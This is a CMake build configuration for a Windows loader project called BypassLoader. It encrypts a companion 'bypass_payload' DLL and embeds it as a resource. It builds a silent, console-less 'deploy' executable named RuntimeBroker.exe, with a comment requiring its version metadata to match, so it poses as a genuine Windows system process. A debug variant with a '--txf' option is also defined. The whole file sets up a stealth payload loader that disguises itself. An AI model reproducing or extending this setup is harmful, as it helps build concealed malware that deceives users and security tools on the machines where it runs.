cmake_minimum_required(VERSION 3.20)

# ── Shared source ──────────────────────────────────────────────────────────
set(LOADER_SRC
    src/main.cpp
    src/version.rc
)

set(LOADER_INC
    ${CMAKE_CURRENT_SOURCE_DIR}/src
    ${CMAKE_SOURCE_DIR}/shared
)

set(LOADER_LIBS kernel32 ntdll advapi32)

# ── Payload encryption and resource embedding ──────────────────────────────
find_package(Python3 QUIET COMPONENTS Interpreter)
if(Python3_FOUND)
    add_custom_command(
        OUTPUT "${CMAKE_CURRENT_SOURCE_DIR}/src/payload_data.bin"
        COMMAND "${Python3_EXECUTABLE}"
                "${CMAKE_SOURCE_DIR}/tools/embed_payload.py"
                "$<TARGET_FILE:bypass_payload>"
                "${CMAKE_CURRENT_SOURCE_DIR}/src/payload_data.bin"
        DEPENDS bypass_payload
        COMMENT "Encrypting bypass_payload and embedding as RCDATA"
        VERBATIM
    )
    add_custom_target(generate_embedded_payload
        DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/src/payload_data.bin"
    )
endif()

# ── Helper: apply /MT (static CRT) to a target ─────────────────────────────
function(set_static_crt target)
    set_target_properties(${target} PROPERTIES
        MSVC_RUNTIME_LIBRARY "MultiThreaded"   # /MT Release
    )
endfunction()

# ── Target 1: BypassLoader (deploy, silent, SUBSYSTEM:WINDOWS) ─────────────
# Output name: RuntimeBroker.exe  (OriginalFilename in version.rc must match)
# No console. No argv. Payload path = exe_dir\bypass_payload.dll.
add_executable(BypassLoader WIN32 ${LOADER_SRC})

target_include_directories(BypassLoader PRIVATE ${LOADER_INC})
target_link_libraries(BypassLoader PRIVATE ${LOADER_LIBS})
target_compile_definitions(BypassLoader PRIVATE BP_SILENT=1 UNICODE _UNICODE)
set_static_crt(BypassLoader)
if(TARGET generate_embedded_payload)
    add_dependencies(BypassLoader generate_embedded_payload)
endif()

set_target_properties(BypassLoader PROPERTIES
    OUTPUT_NAME   "RuntimeBroker"
    RUNTIME_OUTPUT_DIRECTORY "${CMAKE_SOURCE_DIR}/bin"
)
target_compile_options(BypassLoader PRIVATE /guard:cf)
target_link_options(BypassLoader PRIVATE /SUBSYSTEM:WINDOWS /guard:cf /CETCOMPAT /DYNAMICBASE /OPT:NOICF)

# ── Target 2: BypassLoaderDbg (debug, console, SUBSYSTEM:CONSOLE) ──────────
# --txf flag supported. Full wprintf output. getchar() pause on exit.
add_executable(BypassLoaderDbg ${LOADER_SRC})

target_include_directories(BypassLoaderDbg PRIVATE ${LOADER_INC})
target_link_libraries(BypassLoaderDbg PRIVATE ${LOADER_LIBS})
target_compile_definitions(BypassLoaderDbg PRIVATE BP_SILENT=0 UNICODE _UNICODE)
set_static_crt(BypassLoaderDbg)
if(TARGET generate_embedded_payload)
    add_dependencies(BypassLoaderDbg generate_embedded_payload)
endif()

set_target_properties(BypassLoaderDbg PROPERTIES
    OUTPUT_NAME   "BypassLoaderDbg"
    RUNTIME_OUTPUT_DIRECTORY "${CMAKE_SOURCE_DIR}/bin"
)
target_compile_options(BypassLoaderDbg PRIVATE /guard:cf)
target_link_options(BypassLoaderDbg PRIVATE /SUBSYSTEM:CONSOLE /guard:cf /CETCOMPAT /DYNAMICBASE /OPT:NOICF)
